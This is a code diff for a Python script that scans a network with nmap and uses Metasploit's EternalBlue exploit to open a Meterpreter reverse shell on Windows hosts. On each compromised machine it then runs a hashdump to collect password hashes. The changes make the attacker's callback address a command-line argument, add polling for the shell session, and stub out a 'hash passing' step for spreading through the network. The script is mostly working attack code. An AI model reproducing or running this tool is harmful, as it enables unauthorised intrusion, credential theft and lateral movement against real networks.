@@ -1,12 +1,12 @@
 from __future__ import print_function
-
 import nmap
 import re
 import sys
 import subprocess
-from metasploit.msfrpc import MsfRpcClient
 import ssl
 import time
+from subprocess import call
+from metasploit.msfrpc import MsfRpcClient
 
 def header():
     print("""
@@ -67,7 +67,8 @@ def nmScan(ip):
                 targets.append(host_obj)
     return targets
 
-def eternalBlue(ip):
+def eternalBlue(ip, localip):
+    print('Attempting to exploit ' + str(ip) + ' to gain access to the network...')
     # Setup SSL fix
     try:
         _create_unverified_https_context = ssl._create_unverified_context
@@ -82,43 +83,71 @@ def eternalBlue(ip):
     exploit['RHOST'] = ip
     # Load the reverse_tcp shell payload
     payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
-    payload['LHOST'] = '10.202.208.230'
+    payload['LHOST'] = localip
     # Exploit the host
-    exploit.execute(payload=payload)
     proc = exploit.execute(payload=payload)
-    time.sleep(5)
+    jobId = proc.get('job_id')
+    if jobId == 0:
+        jobId = 1
+    timeout = 100
+    count = 0
+    while(jobId not in client.sessions.list.keys() and count < timeout):
+        time.sleep(3)
+        count += 1
+    if count >= timeout:
+        return None
     # Get the shell and run the hashdump
-    shell = client.sessions.session(proc.get('job_id'))
+    shell = client.sessions.session(jobId)
     if shell == None:
         return None
     shell.runsingle('run post/windows/gather/hashdump')
+    
     while(True):
         output = shell.read()
-        if( len(output) > 0):
-            print(output)
         if(':::' in output):
-            return gatherHashes(output)
+            hashes = gatherHashes(output)
+            print('Gained ' + str(len(hashes)) + ' hashes from ' + str(ip) + '...')
+            return hashes
 
+def getArgs(argv):
+    if len(argv) < 4:
+        print('Needs proper command line args')
+        return None
+    args = {}
+    i = 0
+    while i < len(argv):
+        if argv[i] == '-t':
+            args['targetIp'] = argv[i+1]
+            i += 2
+        elif argv[i] == '-l':
+            args['localIp'] = argv[i+1]
+            i += 2
+        else:
+            i += 1
+    return args
+        
 def main():
     header()
-    ip = sys.argv[1]
-    targets = nmScan(ip)
+    # print('Starting msfrpc server...')
+    # call(["msfrpcd", "-P", "password", "-n", "-f", "-a", "127.0.0.1", "&"])
+    args = getArgs(sys.argv)
+    if args == None:
+        return
+    targets = nmScan(args['targetIp'])
     print('Found ' + str(len(targets)) + ' possibly vulnerable machines...')
     # Try to break into machines with eternal blue
-    initHashData = []
     for i in range(len(targets)):
-        hashData = eternalBlue(targets[i].ip)
+        hashData = eternalBlue(targets[i].get('ip'), args['localIp'])
         if hashData != None:
             targets.pop(i)
             initHashData = hashData
             break
     if len(initHashData) > 0:
         # Found access to network start spidering
+        print('Starting hash passing...')
         pass
     else:
         print('Could not gain access to network... bye!')
-    
-
 
 if __name__ == "__main__":
     # execute only if run as a script
